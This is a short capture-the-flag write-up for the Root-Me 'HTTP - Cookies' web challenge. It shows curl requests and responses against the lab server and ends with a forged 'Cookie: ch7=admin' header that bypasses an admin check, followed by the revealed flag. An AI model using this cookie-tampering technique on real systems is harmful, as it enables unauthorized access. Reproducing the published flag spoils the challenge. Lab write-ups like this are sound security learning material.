---
title: HTTP - Cookies
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation]
---

* Points: 20
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies)

## Statement

> Bob created a PHP script to gather user emails
>
> PS: Bob really love cookies!
>
> [http://challenge01.root-me.org/web-serveur/ch7/](http://challenge01.root-me.org/web-serveur/ch7/)

## Solution

```sh
curl -i http://challenge01.root-me.org/web-serveur/ch7/
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 12 Jul 2023 03:09:55 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
```

```html
<br/>
<br/>
<fieldset>

<form method="POST" action="" name="a">
Email<br/>
<input type="text" name="mail" size="20" class="post2" value=""><br/><br/>
<input type="submit" name="jsep4b" size="20" class="post2" value="send"><br/><br/>
</form><!--SetCookie("ch7","visiteur");--><a href="?c=visiteur">Saved email adresses</a><br/></fieldset>
```

Check all the link, as usual
```sh
curl -i http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 12 Jul 2023 03:13:43 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Set-Cookie: ch7=visiteur
```

```html
<br/>
<br/>
<fieldset>

<form method="POST" action="" name="a">
Email<br/>
<input type="text" name="mail" size="20" class="post2" value=""><br/><br/>
<input type="submit" name="jsep4b" size="20" class="post2" value="send"><br/><br/>
</form><!--SetCookie("ch7","visiteur");--><a href="?c=visiteur">Saved email adresses</a><br/>You need to be admin</fieldset>
```

"You need to be admin"...
```sh
curl -i -H "Cookie: ch7=admin" http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
```
```html
<div>Validation password : ml-SYMPA
</div></fieldset>
```

The flag is
```
ml-SYMPA
```